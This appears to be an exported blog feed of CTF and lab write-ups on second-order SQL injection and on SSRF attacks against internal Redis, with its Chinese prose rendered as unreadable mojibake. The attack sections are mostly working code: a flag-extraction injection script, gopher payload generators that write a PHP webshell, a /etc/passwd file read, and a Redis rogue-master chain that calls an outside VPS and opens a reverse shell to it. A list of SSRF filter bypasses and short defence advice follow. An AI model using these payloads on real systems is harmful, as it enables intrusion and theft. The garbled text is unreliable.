2.æœåŠ¡å™¨ä¸­çš„åº”ç”¨ç¨‹åºå¤„ç†æ¶æ„çš„sqlï¼Œå¹¶å‘æ”»å‡»è€…è¿”å›æ³¨å…¥ç»“æœï¼› äºŒæ¬¡æ³¨å…¥æµç¨‹ï¼š â€¢ 1.æ”»å‡»è€…åœ¨æ³¨å…¥ç‚¹æäº¤æ¶æ„sqlè¯­å¥ï¼› â€¢ 2.é€šè¿‡httpè¯·æ±‚ï¼Œå°†æ¶æ„sqlä¿å­˜åˆ°åº”ç”¨ç¨‹åºçš„æ•°æ®åº“ä¸­ï¼› â€¢ 3.æ”»å‡»è€…ç¬¬äºŒæ¬¡æäº¤httpè¯·æ±‚ï¼› â€¢ 4.æœåŠ¡å™¨å¤„ç†ç¬¬äºŒæ¬¡httpè¯·æ±‚ï¼Œæ£€ç´¢å­˜å‚¨åœ¨æ•°æ®åº“ä¸­çš„æ¶æ„sqlï¼Œæ„é€ sqlè¯­å¥ï¼› â€¢ 5.æœåŠ¡å™¨å‘æ”»å‡»è€…è¿”å›æ³¨å…¥ç»“æœï¼› äºŒæ¬¡æ³¨å…¥çš„åŸç†æ•°æ®é¦–æ¬¡æ’å…¥åˆ°æ•°æ®åº“ä¸­æ—¶ï¼Œåº”ç”¨ç¨‹åºä¼šä»¥ï¼ˆ addslashes æˆ–è€…æ˜¯å€ŸåŠ©get*magic*quotes_gpc å¯¹å…¶ä¸­çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œè½¬ä¹‰)å®‰å…¨çš„æ–¹å¼å¤„ç†è¿™äº›æ•°æ®,ä½†æ˜¯ï¼Œè¿™äº›æ•°æ®å¯èƒ½ä¼šè¢«åº”ç”¨ç¨‹åºæœ¬èº«æˆ–è€…å…¶ä»–çš„åç«¯è¿›ç¨‹ä¼šä»¥å±é™©çš„æ–¹å¼å¤„ç†è¿™äº›æ•°æ®ï¼Œä»è€Œé€ æˆäº†äºŒæ¬¡æ³¨å…¥ã€‚ äºŒæ¬¡æ³¨å…¥çš„åˆ©ç”¨åˆ¤æ–­æ³¨å…¥ç‚¹ åœ¨Less-24å®éªŒä¸­ï¼Œé¦–é¡µçš„ç™»å½•ç•Œé¢è¿›è¡Œç›¸åº”çš„åˆ¤æ–­æµ‹è¯•ï¼Œæµ‹è¯•åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥ç‚¹ã€‚ä½†æ˜¯ä¸ç®¡æ€ä¹ˆæ„é€ å‚æ•°å¸¦å…¥å‡å‘ç°é¡µé¢å¦‚ä¸‹æƒ…å†µï¼Œæ²¡æœ‰ä»»ä½•å…¶ä»–å˜åŒ–ï¼Œæ‰€ä»¥åˆ¤æ–­æ­¤å¤„æ— æ³¨å…¥ç‚¹ã€‚ æºç åˆ†æ 12345678910111213141516function sqllogin(){ $username = mysql_real_escape_string($_POST[&quot;login_user&quot;]); $password = mysql_real_escape_string($_POST[&quot;login_password&quot;]); $sql = &quot;SELECT * FROM users WHERE username='$username' and password='$password'&quot;; //$sql = &quot;SELECT COUNT(*) FROM users WHERE username='$username' and password='$password'&quot;; $res = mysql_query($sql) or die('You tried to be real smart, Try harder!!!! :( '); $row = mysql_fetch_row($res); //print_r($row) ; if ($row[1]) { return $row[1]; } else { return 0; } } é€šè¿‡ä»£ç åˆ†æå‘ç°ï¼Œæ•°æ®æ¥æ”¶å‚æ•°login_userå’Œlogin_passwordéƒ½ä¼šç»è¿‡å‡½æ•°mysql_real_escape_stringï¼ˆï¼‰å¤„ç†å­—ç¬¦ä¸²ã€‚ æ­¤å‡½æ•°çš„å…·ä½“å®šä¹‰å¦‚ä¸‹ï¼š mysql_real_escape_stringå‡½æ•°è½¬ä¹‰SQLè¯­å¥ä¸­ä½¿ç”¨çš„å­—ç¬¦ä¸²ä¸­çš„ç‰¹æ®Šå­—ç¬¦. å—å½±å“å­—ç¬¦ï¼š 12345678910111213\\x00\\n\\r\\'&quot;\\x1a ä½¿ç”¨æ­¤å‡½æ•°åï¼ŒåŸºæœ¬ä¸Šä½¿ç”¨è¿™ä¸ªç‚¹æ³¨å…¥ä¸å¤ªå¯èƒ½ã€‚ é¦–é¡µçš„ç™»å½•é¡µä¸è¡Œï¼Œå‘ç°ç™»å½•é¡µä¸‹é¢è¿˜æœ‰ä¸¤ä¸ªåŠŸèƒ½ã€‚ä¸€ä¸ªæ˜¯å¿˜è®°å¯†ç ï¼Œä½ ä¸€ä¸ªæ³¨å†Œæ–°ç”¨æˆ·ã€‚ è¿™é‡Œæˆ‘ä»¬é¦–å…ˆæ³¨å†Œä¸€ä¸ªtestç”¨æˆ·ï¼Œå¯†ç ä¸º111111ï¼Œç„¶åä½¿ç”¨æ­¤ç”¨æˆ·è¿›è¡Œç™»å½•ï¼Œç™»å½•åçš„é¡µé¢å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š æˆ‘ä»¬å‘ç°ç™»å½•æˆåŠŸä¹‹åæ˜¯ä¸€ä¸ªç”¨æˆ·çš„ç™»å½•åå°é¡µï¼Œå¹¶ä¸”è¯¥é¡µé¢æ”¯æŒå½“å‰ç”¨æˆ·çš„å¯†ç ä¿®æ”¹ï¼Œä¿®æ”¹å¯†ç çš„ä»£ç é¡µåç§°ä¸ºpass_change.php. æˆ‘ä»¬æŸ¥çœ‹å½“å‰é¡µé¢ä¿®æ”¹å¯†ç çš„æºä»£ç ï¼Œå¹¶è¿›è¡Œç›¸åº”çš„åˆ†æï¼š 1234567891011121314151617181920212223242526272829303132333435if (isset($_POST['submit'])) { \\# Validating the user input........ $username= $_SESSION[&quot;username&quot;]; $curr_pass= mysql_real_escape_string($_POST['current_password']); $pass= mysql_real_escape_string($_POST['password']); $re_pass= mysql_real_escape_string($_POST['re_password']); if($pass==$re_pass) { $sql = &quot;UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' &quot;; $res = mysql_query($sql) or die('You tried to be smart, Try harder!!!! :( '); $row = mysql_affected_rows(); echo '&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;'; echo '&lt;center&gt;'; if($row==1) { echo &quot;Password successfully updated&quot;; } else { header('Location: failed.php'); //echo 'You tried to be smart, Try harder!!!! :( '; } } else { echo '&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&lt;center&gt;'; echo &quot;Make sure New Password and Retype Password fields have same value&quot;; header('refresh:2, url=index.php'); } } é€šè¿‡æºç æˆ‘ä»¬å¯ä»¥çœ‹åˆ°$usernameæ˜¯ç›´æ¥ä»sessionä¸­è¯»å–çš„ï¼Œå¹¶ä¸”æ²¡æœ‰è¿›è¡Œå‚æ•°çš„è½¬ä¹‰å¤„ç†ã€‚curr_passå’Œre_passç»è¿‡äº†å‡½æ•°mysql_real_escape_stringè½¬ä¹‰å¤„ç†ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥ç›´æ¥æ§åˆ¶usernameè¿™ä¸ªå˜é‡è¿›è¡Œç›¸å…³æ³¨å…¥æ“ä½œã€‚ ç”¨æˆ·æ³¨å†ŒæˆåŠŸåï¼Œä¼šå°†ç”¨æˆ·çš„åŸºæœ¬ä¿¡æ¯å†™å…¥åˆ°æ•°æ®åº“ä¸­å­˜å‚¨ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š å‰é¢æˆ‘ä»¬æåˆ°mysql_real_escape_stringå‡½æ•°å¯ä»¥å°†å­—ç¬¦ä¸²è½¬ä¹‰ç›´æ¥å†™å…¥åˆ°æ•°æ®åº“ä¸­å­˜å‚¨ã€‚ å¹¶ä¸”ç”±æºç æˆ‘ä»¬çŸ¥é“ä¿®æ”¹å¯†ç çš„SQLä»£ç ä¸ºï¼š $sql = &quot;UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' &quot;; usernameå˜é‡æ˜¯ç›´æ¥è¯»å–æ•°æ®åº“çš„å†…å®¹ï¼Œå¹¶ä¸”æ²¡æœ‰ç»è¿‡è½¬ä¹‰ã€‚ è¿™è¾¹çš„æ€è·¯æ˜¯ï¼Œå¯ä»¥ç›´æ¥æ„é€ ä¸€ä¸ªtest'#ç”¨æˆ·ï¼Œæ–°å»ºæ­¤ç”¨æˆ·ï¼Œå†ç™»å½•è¿›è¡ŒäºŒæ¬¡ç”¨æˆ·è°ƒç”¨ä¿®æ”¹å¯†ç çš„æ—¶å€™ï¼ŒåŸSQLè¯­å¥å˜ä¸º: $sql = &quot;UPDATE users SET PASSWORD='$pass' where username='test'#' and password='$curr_pass' &quot;; ç”±äº#å·æ³¨é‡Šæ‰äº†åé¢çš„è¯­å¥ï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬æœ¬æ¥ä¿®æ”¹çš„test'#çš„å¯†ç ï¼Œä½†å®é™…ä¸Šä¿®æ”¹äº†testçš„å¯†ç ï¼Œè€Œä¸”test'#å½“å‰å¯†ç å¯ä»¥ä»»æ„è¾“å…¥ã€‚ åˆ›å»ºtest'#ç”¨æˆ· ç”¨æˆ·åtest'# å¯†ç 88888 åˆ›å»ºå®Œæˆåï¼Œæ­£å¸¸ç™»é™† æŸ¥çœ‹æ•°æ®ï¼Œå‘ç°ç”¨æˆ·test'#å·²è¢«æˆåŠŸå†™å…¥æ•°æ®åº“ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š ä¿®æ”¹å½“å‰ç”¨æˆ·å¯†ç  ä¿®æ”¹å½“å‰ç”¨æˆ·æ–°å¯†ç ä¸º66666ï¼Œå¹¶ä¸”ç”¨æˆ·çš„å½“å‰å¯†ç ä¸º888888ï¼Œæ­¤å¤„å¯ä»¥è¾“å…¥ä»»æ„çš„å¯†ç ä¸º222222ï¼Œå¯ä»¥æ­£å¸¸ä¿®æ”¹å¯†ç ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š æŸ¥çœ‹æ•°æ®åº“ï¼Œå‘ç°testç”¨æˆ·è¢«æ­£å¸¸ä¿®æ”¹ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š ç”±æ­¤å°±æ˜¯æ•´ä¸ªäºŒæ¬¡æ³¨å…¥çš„åˆ©ç”¨è¿‡ç¨‹ï¼Œè¿™è¾¹æˆ‘é—¨åªè¦ç›¸åº”çš„æ„é€ ç®¡ç†å‘˜çš„ç”¨æˆ·åå°±å¯ä»¥ä»»æ„ä¿®æ”¹ç®¡ç†å‘˜è´¦æˆ·çš„ç”¨æˆ·åå’Œå¯†ç ã€‚ çœŸé¢˜ç¯å¢ƒå¤ç°(ç½‘é¼æ¯2018-Unfinish)é¢˜ç›®å¤ç°ä½¿ç”¨buuå¹³å°å¤ç° ç½‘é¼æ¯2018-Unfinish é¢˜ç›®åˆ†æé¦–å…ˆè¯·æ±‚å‘ç°æ˜¯ä¸€ä¸ªç™»å½•é¡µï¼Œä½¿ç”¨å‡ ä¸ªå¸¸ç”¨ç”¨æˆ·åå’Œå¯†ç å°è¯•ç™»å½•ï¼Œæ²¡æœ‰ä»»ä½•ä¿¡æ¯ï¼› ä½¿ç”¨webæ‰«æå™¨ï¼Œå‘ç°å­˜åœ¨register.phpæ³¨å†ŒåŠŸèƒ½é¡µé¢ï¼Œå°è¯•æ³¨å†Œä¸€ä¸ªç”¨æˆ·å¹¶ç™»å½•ï¼› ç™»å½•æˆåŠŸåï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ç™»å½•æˆåŠŸé¡µå‘ç°ç™»å½•ç”¨æˆ·çš„ç”¨æˆ·åï¼› é‚£ä¹ˆè¿™ç§é¢˜å‹æˆ‘ä»¬èƒ½æƒ³åˆ°å°±æ˜¯äºŒæ¬¡æ³¨å…¥çš„å¯èƒ½æ€§æœ€å¤§ï¼› å¹¶ä¸”æ³¨å†Œæ—¶æœ‰ä¸ªç‰¹ç‚¹ï¼Œå°±æ˜¯æ³¨å†ŒæˆåŠŸä¼šå¾—åˆ°302çš„çŠ¶æ€ç å¹¶è·³è½¬è‡³login.phpï¼›å¦‚æœæ³¨å†Œå¤±è´¥ï¼Œåªä¼šè¿”å›200çš„çŠ¶æ€ç ï¼› å¹¶ä¸”é‡Œé¢æœ‰ä¸€å®šçš„å­—ç¬¦ä¸²è¿‡æ»¤,ç®€å•æµ‹è¯•ï¼Œå¤§æ¦‚è¿‡æ»¤äº†é€—å·ï¼Œinformation_schemaç­‰å­—ç¬¦ï¼› ä¸€èˆ¬è¿‡æ»¤äº†information_schemaå­—ç¬¦çš„è¯ï¼Œå°±å¾ˆå°‘å¯èƒ½åœ¨å†èƒ½ç›´æ¥æ‹†è§£åº“è¡¨å­—æ®µåï¼Œæ‰€ä»¥è¿™é‡ŒçŒœæµ‹æ˜¯flag; payload:0'%2bascii(substr(database() from 1 for 1))%2b'0ï¼›æ³¨å†ŒåæˆåŠŸè·å–åˆ°åº“åç¬¬ä¸€ä¸ªé¦–å­—æ¯çš„asciiå€¼ï¼› æ„é€ è·å–flagçš„payload;0'%2bascii(substr((select * from flag) from 1 for 1))%2b'0 æŒ‰ç…§æ­¤æ–¹æ³•ä»¥ä¾æ¬¡çŒœè§£flagçš„å­—æ®µå†…å®¹å³å¯ï¼Œè¿™é‡Œç›´æ¥ä¸Šè„šæœ¬ï¼š 123456789101112131415161718192021222324252627282930#!/usr/local/env pyton3# -*- coding:utf-8 -*-import requestsimport reimport timeimport sysregister_url = 'http://34de0eee-d1e3-42cd-a1cd-5127e8032f8f.node3.buuoj.cn/register.php'login_url = 'http://34de0eee-d1e3-42cd-a1cd-5127e8032f8f.node3.buuoj.cn/login.php'email = &quot;admin{}@qq.com&quot;payload = &quot;0'+ascii(substr((select * from flag) from {} for 1))+'0&quot;for i in range(1, 50): time.sleep(1) data = { 'email': email.format(i), 'username': payload.format(i), 'password': &quot;admin&quot; } #print(data) r1 = requests.post(url = register_url, data = data) r2 = requests.post(url = login_url, data = {'email': email.format(i), 'password': &quot;admin&quot;}) #print(r2.text) pattern = r'&lt;span class=\\&quot;user-name\\&quot;&gt;\\s*(\\d{1,10})\\s*&lt;' flag_str = re.findall(pattern,r2.text)[0] sys.stdout.write(chr(int(flag_str))) sys.stdout.flush()","link":"/2021/02/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/sql-injection/sql-injection-advanced/"},{"title":"SSRFä¸»ä»å¤åˆ¶getshell","text":"redis_getshell_ezwebç¯å¢ƒå¤ç°ubuntu 16.04 + docker 12cd dockerdocker-compose up -d æ¼æ´åˆ©ç”¨å³é”®æºç å‘ç°å¦‚ä¸‹å¤‡æ³¨ä¿¡æ¯ 1&lt;!--?secret--&gt; ç›´æ¥è¯·æ±‚ï¼Œè·å–å½“å‰é¶æœºç¯å¢ƒçš„ipåœ°å€ ç›´æ¥å¸¦å…¥æäº¤æ¡†ä¸­è¿›è¡Œhttpè¯·æ±‚ æ ¹æ®urlæ ¼å¼ï¼Œå’Œé¡µé¢æ˜¾ç¤ºæƒ…å†µï¼Œæ€€ç–‘æ˜¯ä¸€ä¸ªssrfåˆ©ç”¨ï¼Œå°è¯•æ¢æµ‹å†…ç½‘æ˜¯å¦æœ‰redisæœåŠ¡ï¼Œæµ‹è¯•å‡ºredisæœåŠ¡çš„åœ°å€ä¸º192.168.144.2 å¹¶ä¸”è¿›è¿‡åç»­æµ‹è¯•å‘ç°ç›®æ ‡ç¯å¢ƒæ˜¯å­˜åœ¨è¿‡æ»¤çš„ï¼Œè¿‡æ»¤äº†file://,dict:// è¿™é‡Œç›´æ¥ä½¿ç”¨gopheråè®®ç›´æ¥ç”¨è„šæœ¬å°è¯•å†™å…¥webshell 12345678910111213141516171819202122232425262728293031323334353637383940#!/usr/local/env python3# -*- coding:utf-8 -*-import urllibimport requests#è„šæœ¬å‚æ•°ä¿®æ”¹å¤„PATH = '/var/www/html' FILENAME = 'shell.php' DEST_REDIS_IP = '192.168.144.2' #å­˜åœ¨redisçš„ç›®æ ‡ä¸»æœºIPSSRF_VUL_IP = 'http://192.168.1.191:5000/index.php?url={}&amp;submit=%E6%8F%90%E4%BA%A4'# ç”Ÿæˆpayloaddef generate_payload(): gopher = &quot;gopher://{}:6379/_&quot;.format(DEST_REDIS_IP) redis_command = &quot;&quot;&quot;flushallset 1 &quot;&lt;?php system('cat /flag');?&gt;&quot;config set dir {}config set dbfilename {}savequit &quot;&quot;&quot;.format(PATH, FILENAME) urlencode_one = urllib.parse.quote(redis_command, 'utf-8') replace_str = urlencode_one.replace('%0A', '%0D%0A') urlencode_two = urllib.parse.quote(replace_str, 'utf-8') payload = gopher + urlencode_two return payloaddef main(): payload = generate_payload() url = SSRF_VUL_IP.format(payload) print(url) res = requests.get(url = url, timeout = 1) print(res.text)if __name__ == '__main__': main() æ ¹æ®è¿”å›ä¿¡æ¯å‘ç°ï¼Œåˆ¤æ–­åº”è¯¥å†™å…¥æˆåŠŸ å°è¯•è¯·æ±‚å†™å…¥çš„shellï¼ŒæˆåŠŸè·å–flag SSRFæ‰“å†…ç½‘redisä¸»ä»å¤åˆ¶å¤ç°ç¯å¢ƒè¿™é‡Œé¢˜ç›®ä½¿ç”¨çš„æ˜¯2020å¹´ç½‘é¼ç„æ­¦ç»„çš„ä¸€é“é¢˜ç›® ç¯å¢ƒåœ°å€ï¼šç½‘é¼æ¯ 2020 ç„æ­¦ç»„ SSRFMe https://buuoj.cn/challenges urlé€»è¾‘é™åˆ¶çš„ç»•è¿‡è¿™é‡Œçš„ç»•è¿‡æ–¹å¼æœ‰å¾ˆå¤šï¼Œè¿™é‡Œç›´æ¥ä½¿ç”¨http://0.0.0.0è¿›è¡Œç»•è¿‡ï¼Œè¯·æ±‚hint.phpï¼Œè·å–redisçš„å¯†ç ä¸ºroot ä½¿ç”¨dict://åè®®è¿›è¡Œæ¢æµ‹ï¼Œå‘ç°å­˜åœ¨redisï¼Œä¸”éœ€è¦è®¤è¯ ssrfä¸»ä»å¤åˆ¶getshellè¿™é‡Œä¸»è¦ä½¿ç”¨gopher://åè®®; buuçš„ç¯å¢ƒæƒé™å¤ç°çš„æœ‰äº›é—®é¢˜ï¼Œä½†æ˜¯è¿™ä¸å½±å“æˆ‘ä»¬åšé¢˜ï¼Œç›´æ¥é‡‡ç”¨é¢„æœŸæ€è·¯è§£é¢˜ï¼› å…¬ç½‘vpsä½¿ç”¨redis-rogue-serverä¼ªé€ ä¸»æœåŠ¡ å·¥å…·ä¸‹è½½åœ°å€ https://github.com/n0b0dyCN/redis-rogue-server/ å¯åŠ¨æœåŠ¡ python3 redis-rogue-server.py --rhost=127.0.0.1 --rport=6379 --lhost=149.x.x.x æœ¬åœ°ç›‘å¬ nc -lvnp 6379 è®¾ç½®ç›®å½• http://e3c2954c-bbf9-47dd-a41a-b7883db9a90c.node3.buuoj.cn/?url=gopher://0.0.0.0:6379/_ 12345678910auth rootconfig set dir /tmp/quit%25%36%31%25%37%35%25%37%34%25%36%38%25%32%30%25%37%32%25%36%66%25%36%66%25%37%34%25%30%64%25%30%61%25%36%33%25%36%66%25%36%65%25%36%36%25%36%39%25%36%37%25%32%30%25%37%33%25%36%35%25%37%34%25%32%30%25%36%34%25%36%39%25%37%32%25%32%30%25%32%66%25%37%34%25%36%64%25%37%30%25%32%66%25%30%64%25%30%61%25%37%31%25%37%35%25%36%39%25%37%34auth rootconfig set dbfilename exp.soslaveof 149.129.47.247 21000quit%25%36%31%25%37%35%25%37%34%25%36%38%25%32%30%25%37%32%25%36%66%25%36%66%25%37%34%25%30%64%25%30%61%25%36%33%25%36%66%25%36%65%25%36%36%25%36%39%25%36%37%25%32%30%25%37%33%25%36%35%25%37%34%25%32%30%25%36%34%25%36%32%25%36%36%25%36%39%25%36%63%25%36%35%25%36%65%25%36%31%25%36%64%25%36%35%25%32%30%25%36%35%25%37%38%25%37%30%25%32%65%25%37%33%25%36%66%25%30%64%25%30%61%25%37%33%25%36%63%25%36%31%25%37%36%25%36%35%25%36%66%25%36%36%25%32%30%25%33%31%25%33%34%25%33%39%25%32%65%25%33%31%25%33%32%25%33%39%25%32%65%25%33%34%25%33%37%25%32%65%25%33%32%25%33%34%25%33%37%25%32%30%25%33%32%25%33%31%25%33%30%25%33%30%25%33%30%25%30%64%25%30%61%25%37%31%25%37%35%25%36%39%25%37%34 å¯¼å…¥æ¨¡å— 1234auth rootmodule load ./exp.soquit%25%36%31%25%37%35%25%37%34%25%36%38%25%32%30%25%37%32%25%36%66%25%36%66%25%37%34%25%30%64%25%30%61%25%36%64%25%36%66%25%36%34%25%37%35%25%36%63%25%36%35%25%32%30%25%36%63%25%36%66%25%36%31%25%36%34%25%32%30%25%32%65%25%32%66%25%36%35%25%37%38%25%37%30%25%32%65%25%37%33%25%36%66%25%30%64%25%30%61%25%37%31%25%37%35%25%36%39%25%37%34 å…³é—­ä¸»ä» 1234auth rootslaveof no onequit%25%36%31%25%37%35%25%37%34%25%36%38%25%32%30%25%37%32%25%36%66%25%36%66%25%37%34%25%30%64%25%30%61%25%37%33%25%36%63%25%36%31%25%37%36%25%36%35%25%36%66%25%36%36%25%32%30%25%36%65%25%36%66%25%32%30%25%36%66%25%36%65%25%36%35%25%30%64%25%30%61%25%37%31%25%37%35%25%36%39%25%37%34 è®¾ç½®æ•°æ®åº“ 1234auth rootconfig set dbfilename dump.rdb quit%25%36%31%25%37%35%25%37%34%25%36%38%25%32%30%25%37%32%25%36%66%25%36%66%25%37%34%25%30%64%25%30%61%25%36%33%25%36%66%25%36%65%25%36%36%25%36%39%25%36%37%25%32%30%25%37%33%25%36%35%25%37%34%25%32%30%25%36%34%25%36%32%25%36%36%25%36%39%25%36%63%25%36%35%25%36%65%25%36%31%25%36%64%25%36%35%25%32%30%25%36%34%25%37%35%25%36%64%25%37%30%25%32%65%25%37%32%25%36%34%25%36%32%25%32%30%25%30%64%25%30%61%25%37%31%25%37%35%25%36%39%25%37%34 åå¼¹shell 1234auth rootsystem.rev 149.129.47.247 9999quit%25%36%31%25%37%35%25%37%34%25%36%38%25%32%30%25%37%32%25%36%66%25%36%66%25%37%34%25%30%64%25%30%61%25%37%33%25%37%39%25%37%33%25%37%34%25%36%35%25%36%64%25%32%65%25%37%32%25%36%35%25%37%36%25%32%30%25%33%31%25%33%34%25%33%39%25%32%65%25%33%31%25%33%32%25%33%39%25%32%65%25%33%34%25%33%37%25%32%65%25%33%32%25%33%34%25%33%37%25%32%30%25%33%39%25%33%39%25%33%39%25%33%39%25%30%64%25%30%61%25%37%31%25%37%35%25%36%39%25%37%34 éé¢„æœŸè§£è¿™è¾¹æ˜¯å› ä¸ºæƒé™æ²¡æœ‰æ§åˆ¶åˆ°ä½çš„åŸå› ï¼Œå¯¼è‡´å¯ä»¥ç›´æ¥å‘ç›®æ ‡æœåŠ¡å™¨webç›®å½•å†™shellï¼Œè¿™é‡Œå°±ç›´æ¥ä¸Šè„šæœ¬ 12345678910111213141516171819202122232425262728293031323334353637383940#!/usr/local/env python3# -*- coding:utf-8 -*-import urllibimport requests#è„šæœ¬å‚æ•°ä¿®æ”¹å¤„PATH = '/var/www/html' FILENAME = 'shell.php' DEST_REDIS_IP = '192.168.144.2' #å­˜åœ¨redisçš„ç›®æ ‡ä¸»æœºIPSSRF_VUL_IP = 'http://192.168.1.191:5000/index.php?url={}&amp;submit=%E6%8F%90%E4%BA%A4'# ç”Ÿæˆpayloaddef generate_payload(): gopher = &quot;gopher://{}:6379/_&quot;.format(DEST_REDIS_IP) redis_command = &quot;&quot;&quot;AUTH rootflushallset 1 &quot;&lt;?php system('cat /flag');?&gt;&quot;config set dir {}config set dbfilename {}savequit &quot;&quot;&quot;.format(PATH, FILENAME) urlencode_one = urllib.parse.quote(redis_command, 'utf-8') replace_str = urlencode_one.replace('%0A', '%0D%0A') urlencode_two = urllib.parse.quote(replace_str, 'utf-8') payload = gopher + urlencode_two return payloaddef main(): payload = generate_payload() url = SSRF_VUL_IP.format(payload) print(url) #res = requests.get(url = url, timeout = 1) #print(res.text)if __name__ == '__main__': main() ssrfç»•è¿‡ä¸é˜²å¾¡å¸¸ç”¨ç»•è¿‡æ–¹æ³•1.@ 123http://abc@127.0.0.1å®é™…ä¸Šæ˜¯ä»¥ç”¨æˆ·åabcè¿æ¥åˆ°ç«™ç‚¹127.0.0.1ï¼ŒåŒç†http://8.8.8.8@127.0.0.1:8080ã€http://127.0.0.1#8.8.8.8 åœ¨å¯¹@è§£æåŸŸåä¸­ï¼Œä¸åŒçš„å¤„ç†å‡½æ•°å­˜åœ¨å¤„ç†å·®å¼‚ï¼Œå¦‚ï¼šhttp://www.aaa.com@www.bbb.com@www.ccc.comåœ¨PHPçš„parse_urlä¸­ä¼šè¯†åˆ«www.ccc.comï¼Œè€Œ`libcur`låˆ™è¯†åˆ«ä¸ºwww.bbb.com 2.åˆ©ç”¨[::]å¯ä»¥åˆ©ç”¨[::]æ¥ç»•è¿‡localhost 1http://[::]:80/ &gt;&gt;&gt; http://127.0.0.1 3.æ·»åŠ ç«¯å£å· 1http://127.0.0.1:8080 4.åˆ©ç”¨çŸ­ç½‘å€ç«™é•¿å·¥å…·çŸ­ç½‘å€ç™¾åº¦çŸ­ç½‘å€5.åˆ©ç”¨ç‰¹æ®ŠåŸŸååŸç†æ˜¯DNSè§£æã€‚xip.ioå¯ä»¥æŒ‡å‘ä»»æ„åŸŸåï¼Œå³ 1127.0.0.1.xip.ioï¼Œå¯è§£æä¸º127.0.0.1 6.åˆ©ç”¨DNSè§£æåœ¨åŸŸåä¸Šè®¾ç½®Aè®°å½•ï¼ŒæŒ‡å‘127.0.17.åˆ©ç”¨è¿›åˆ¶è½¬æ¢ 127.0.0.1å…«è¿›åˆ¶ï¼š0177.0.0.1åå…­è¿›åˆ¶ï¼š0x7f.0.0.1åè¿›åˆ¶ï¼š2130706433 8.å¥å· 1127ã€‚0ã€‚0ã€‚1 &gt;&gt;&gt; 127.0.0.1 9.302è·³è½¬ä½¿ç”¨https://tinyurl.comç”Ÿæˆ302è·³è½¬åœ°å€ å¸¸è§é™åˆ¶æ‰‹æ®µ1.é™åˆ¶ä¸ºhttp://www.xxx.com åŸŸåé‡‡ç”¨httpåŸºæœ¬èº«ä»½è®¤è¯çš„æ–¹å¼ç»•è¿‡ã€‚å³@http://www.xxx.com@www.xxc.com2.é™åˆ¶è¯·æ±‚IPä¸ä¸ºå†…ç½‘åœ°å€å½“ä¸å…è®¸ipä¸ºå†…ç½‘åœ°å€æ—¶ï¼ˆ1ï¼‰é‡‡å–çŸ­ç½‘å€ç»•è¿‡ï¼ˆ2ï¼‰é‡‡å–ç‰¹æ®ŠåŸŸåï¼ˆ3ï¼‰é‡‡å–è¿›åˆ¶è½¬æ¢3.é™åˆ¶è¯·æ±‚åªä¸ºhttpåè®®ï¼ˆ1ï¼‰é‡‡å–302è·³è½¬ï¼ˆ2ï¼‰é‡‡å–çŸ­åœ°å€ SSRFæ¼æ´é˜²å¾¡1ã€ç¦ç”¨ä¸éœ€è¦çš„åè®®(å¦‚ï¼šfile:///ã€gopher://,dict://ç­‰)ã€‚ä»…ä»…å…è®¸httpå’Œhttpsè¯·æ±‚2ã€ç»Ÿä¸€é”™è¯¯ä¿¡æ¯ï¼Œé˜²æ­¢æ ¹æ®é”™è¯¯ä¿¡æ¯åˆ¤æ–­ç«¯å£çŠ¶æ€3ã€ç¦æ­¢302è·³è½¬ï¼Œæˆ–æ¯æ¬¡è·³è½¬ï¼Œéƒ½æ£€æŸ¥æ–°çš„Hostæ˜¯å¦æ˜¯å†…ç½‘IPï¼Œç›´åˆ°æŠµè¾¾æœ€åçš„ç½‘å€4ã€è®¾ç½®URLç™½åå•æˆ–è€…é™åˆ¶å†…ç½‘IP","link":"/2020/08/16/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/ssrf/ssrf-redis-getshell-ctf/"},{"title":"ssrfæ‰“å†…ç½‘redis","text":"ssrfæ‰“å†…ç½‘redisæœ¬åœ°æ”»å‡»çš„åˆ©ç”¨æ–¹å¼ï¼ˆ1ï¼‰ä½¿ç”¨fileåè®® file protocol (ä»»æ„æ–‡ä»¶è¯»å–) 1curl -vvv &quot;192.168.1.191:32768/ssrf.php?url=file:///etc/passwd&quot; ï¼ˆ2ï¼‰ä½¿ç”¨dictåè®® dict protocol (è·å–Redisé…ç½®ä¿¡æ¯) 1curl -vvv &quot;192.168.1.191:32768/ssrf.php?url=dict://172.17.0.2:6379/info&quot; ï¼ˆ3ï¼‰ä½¿ç”¨gopheråè®®(ä¿—ç§°ä¸‡èƒ½åè®®) gopherçš„åè®®ä½¿ç”¨æ ¼å¼ï¼š 1gopher://ip:6379/_æ•°æ® é¦–å…ˆä½¿ç”¨ä¸Šè¿°æŠ“åŒ…è·å–çš„æ•°æ®æ ¼å¼ 1234567891011*2$3get$3age*2$3get$4name è¿›è¡Œurlè½¬ç  1%2a%32%0a%24%33%0a%67%65%74%0a%24%33%0a%61%67%65%0a%2a%32%0a%24%33%0a%67%65%74%0a%24%34%0a%6e%61%6d%65%0a å°†å…¶ä¸­çš„%0aæ›¿æ¢æˆ%0d%0a 1%2a%32%0d%0a%24%33%0d%0a%67%65%74%0d%0a%24%33%0d%0a%61%67%65%0d%0a%2a%32%0d%0a%24%33%0d%0a%67%65%74%0d%0a%24%34%0d%0a%6e%61%6d%65%0d%0a ä½¿ç”¨gopheråè®®å‘åŒ… 1curl -v &quot;gopher://192.168.1.191:6379/_%2a%32%0d%0a%24%33%0d%0a%67%65%74%0d%0a%24%33%0d%0a%61%67%65%0d%0a%2a%32%0d%0a%24%33%0d%0a%67%65%74%0d%0a%24%34%0d%0a%6e%61%6d%65%0d%0a&quot; è¿”å›ç»“æœ åº”ç”¨ç¯å¢ƒéƒ¨ç½²æ”»å‡»æœº:kaliï¼ˆ192.168.1.122ï¼‰ 